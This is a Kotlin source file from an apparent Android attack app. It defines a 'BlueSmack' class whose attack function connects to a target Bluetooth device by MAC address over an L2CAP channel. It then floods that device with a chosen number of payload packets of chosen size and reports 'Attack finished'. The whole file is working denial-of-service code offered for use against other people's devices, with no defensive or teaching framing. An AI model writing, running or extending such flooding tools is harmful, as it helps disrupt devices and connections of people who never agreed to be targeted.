package com.hereliesaz.blusnu.attack

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import java.io.IOException

import android.widget.Toast
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class BlueSmack(
    private val context: Context,
    private val bluetoothAdapter: BluetoothAdapter?
) {
    suspend fun attack(macAddress: String, packetSize: Int, packetCount: Int) {
        if (bluetoothAdapter == null) {
            // TODO: Propagate error to UI: Bluetooth not supported
            return
        }

        val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
        if (device == null) {
            // TODO: Propagate error to UI: Device not found
            return
        }

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.BLUETOOTH_CONNECT
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // TODO: Propagate error to UI: Missing permission
            return
        }

        withContext(Dispatchers.IO) {
            try {
                device.createL2capChannel(1).use { socket -> // PSM for SDP
                    socket.connect()
                    val outputStream = socket.outputStream
                    val payload = ByteArray(packetSize)
                    for (i in 0 until packetCount) {
                        outputStream.write(payload)
                    }
                    withContext(Dispatchers.Main) {
                        Toast.makeText(context, "Attack finished", Toast.LENGTH_SHORT).show()
                    }
                }
            } catch (e: IOException) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                }
                e.printStackTrace()
            }
        }
    }
}